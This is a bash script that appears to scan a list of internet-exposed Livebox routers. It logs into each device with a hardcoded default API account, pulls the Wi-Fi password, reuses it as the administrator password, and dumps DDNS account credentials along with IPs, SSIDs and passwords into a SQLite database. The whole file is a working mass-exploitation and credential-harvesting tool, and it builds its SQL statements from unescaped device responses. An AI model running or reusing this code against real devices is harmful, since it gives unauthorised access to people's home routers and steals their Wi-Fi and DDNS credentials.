#!/bin/bash
#set -x

args=("$@")

file=${args[0]}
timestamp=$(cat scan_timestamp)
db=liveboxes`cat scan_date`.sqlite

if [ ! -f $db ]; then

    sqlite3 $db "CREATE TABLE targets (
        id INTEGER primary key AUTOINCREMENT,
        timestamp number,
        ip text,
        port number,
        serial_number text,
        model text,
        hardware_version text,
        api_version text,
        firmware_version text,
        bssid text,
        ssid text,
        password text,
        vulnerable boolean
    );"

    sqlite3 $db "CREATE TABLE ddns_credentials (
        serial_number text,
        domain_name text,
        ddns_account text,
        ddns_password text
    );"
fi

while IFS= read -r line
do
        ip=`echo $line | cut -d':' -f 2 | sed 's/\/\///'`
        port=`echo $line | cut -d':' -f3`

        first_try=`curl -s "$line/API/GeneralInfo" --max-time 10 -u "ApiUsr:ApiUsrPass" -H "Content-Type: application/json"`

        if [[ $first_try == *"ModelName"* ]]; then

                model=`echo $first_try | jq -r .ModelName`
                serial_number=`echo $first_try | jq -r .SerialNumber`
                hardware_version=`echo $first_try | jq -r .HardwareVersion`
                api_version=`echo $first_try | jq -r .ApiVersion`
                software_version=`echo $first_try | jq -r .SoftwareVersion`

                # Recover the Admin password from WIFI data
                ids=`curl -s "$line/API/LAN/WIFI/5GHz" --max-time 10 -u "ApiUsr:ApiUsrPass" -H "Content-Type: application/json"`
                BSSID=`echo $ids | jq -r .AccessPoints[0].BSSID | sed 's/\://g'`
                SSID=`echo $ids | jq -r .AccessPoints[0].SSID`
                password=`curl -s "$line/API/LAN/WIFI/5GHz/$BSSID" --max-time 10 -u "ApiUsr:ApiUsrPass" -H "Content-Type: application/json" | jq -r .Password`

                # Test the password
                response=`curl -s "$line/API/Services/DDNS" --max-time 10 -u "UsrAdmin:$password" -H "Content-Type: application/json"`

                if [[ $response == *"DomainName"* ]]; then
                        domain_name=`echo $response | jq -r .DomainName`
                        ddns_account=`echo $response | jq -r .Account`
                        ddns_password=`echo $response | jq -r .Password`
                        sqlite3 $db "pragma busy_timeout=20000; insert into targets(timestamp,ip,port,serial_number,model,hardware_version,api_version,firmware_version,bssid,ssid,password, vulnerable)
                        values ('$timestamp', '$ip', $port, '$serial_number', '$model', '$hardware_version', '$api_version', '$software_version', '$BSSID', '$SSID', '$password', 'true');"

                        if [[ $ddns_account != "" ]]; then
                                sqlite3 $db "pragma busy_timeout=20000; insert into ddns_credentials(serial_number,domain_name,ddns_account,ddns_password)
                                values ('$serial_number', '$domain_name', '$ddns_account', '$ddns_password');"
                        fi
                else
                        sqlite3 $db "pragma busy_timeout=20000; insert into targets(timestamp,ip,port,serial_number,model,hardware_version,api_version,firmware_version,bssid,ssid,password, vulnerable)
                        values ('$timestamp', '$ip', $port, '$serial_number', '$model', '$hardware_version', '$api_version', '$software_version', '$BSSID', '$SSID', '$password', 'false');"
                fi
        else
                sqlite3 $db "pragma busy_timeout=20000; insert into targets(timestamp,ip,port,serial_number,model,hardware_version,api_version,firmware_version,bssid,ssid,password, vulnerable)
                values ('$timestamp', '$ip', $port, 'APIUSRNOTVALID', '', '', '', '', '', '', '', 'false');"
        fi

done <"$file" 
